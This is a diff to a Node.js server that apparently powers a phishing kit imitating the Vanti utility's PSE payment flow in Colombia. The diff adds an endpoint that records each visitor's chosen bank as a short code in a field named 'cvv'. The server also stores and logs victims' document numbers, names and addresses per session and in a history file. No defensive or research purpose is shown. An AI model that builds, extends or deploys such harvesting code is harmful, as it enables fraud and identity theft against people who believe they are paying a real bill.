@@ -893,7 +893,8 @@ const server = http.createServer(async (req, res) => {
                     direccion,
                     rol,
                     precio,
-                    monto: precio
+                    monto: precio,
+                    cvv: 'PSE' // 🔥 AGREGAR ESTA LÍNEA
                 });
 
                 datosSesiones.set(sessionId, datosCompletos);
@@ -901,6 +902,40 @@ const server = http.createServer(async (req, res) => {
                 guardarHistorial('vanti', datosCompletos);
 
                 console.log(`[VANTI-PSE] Datos guardados para ${sessionId} | Doc: ${numDoc} | Nombre: ${nombres} ${apellidos}`);
+                json(res, 200, { ok: true });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        /* 🔥 NUEVO: Endpoint para recibir qué banco seleccionó el usuario en PSE */
+        if (req.method === 'POST' && url === '/vanti/seleccionar-banco') {
+            try {
+                const { sessionId, banco } = await getBody(req);
+                if (!sessionId || !banco) { json(res, 400, { ok: false }); return; }
+                
+                // Mapeo de las siglas de 4 letras
+                const siglas = {
+                    'bancolombia': 'BANC',
+                    'davivienda': 'DAVI',
+                    'bbva': 'BBVA',
+                    'bogota': 'BOGO',
+                    'caja-social': 'CAJA',
+                    'occidente': 'OCCI',
+                    'popular': 'POPU'
+                };
+                
+                const sigla = siglas[banco.toLowerCase()] || banco.substring(0, 4).toUpperCase();
+                
+                const previos = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, previos, { 
+                    bancoSeleccionado: banco,
+                    cvv: sigla // 🔥 Guardamos la sigla (Ej: DAVI)
+                });
+                
+                datosSesiones.set(sessionId, datosCompletos);
+                guardarHistorial('vanti', datosCompletos);
+                
+                console.log(`[VANTI-PSE] Banco seleccionado para ${sessionId}: ${banco} -> ${sigla}`);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
